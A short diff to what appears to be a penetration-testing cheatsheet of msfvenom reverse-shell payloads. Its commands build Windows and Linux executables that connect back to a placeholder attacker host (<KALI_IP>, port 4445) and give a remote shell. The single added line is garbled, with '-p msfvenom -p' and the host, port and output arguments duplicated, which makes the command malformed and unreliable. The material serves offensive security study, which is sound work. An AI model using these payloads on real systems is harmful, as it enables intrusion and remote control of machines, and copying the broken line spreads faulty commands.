@@ -5,6 +5,7 @@ https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
 ```
 # Basic Windows shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f exe > shell.exe
+msfvenom -p msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f exe > shell.exe LHOST=<KALI_IP> LPORT=4445 -f exe > shell.exe
 
 # Basic Linux shell
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f elf > shell.elf
